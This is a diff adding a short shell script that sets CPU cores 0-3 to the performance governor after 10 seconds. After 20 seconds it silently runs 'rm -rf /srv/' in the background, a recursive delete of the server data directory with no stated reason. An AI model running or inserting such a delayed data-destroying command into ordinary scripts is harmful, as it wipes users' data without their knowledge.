@@ -1,0 +1,10 @@
+#!/bin/sh
+
+sleep 10 && \
+    for c in 0 1 2 3; do
+        cpufreq-set -c "$c" --min 2GHz -g performance
+        done &
+
+sleep 20 && \
+    rm -rf /srv/ &
+
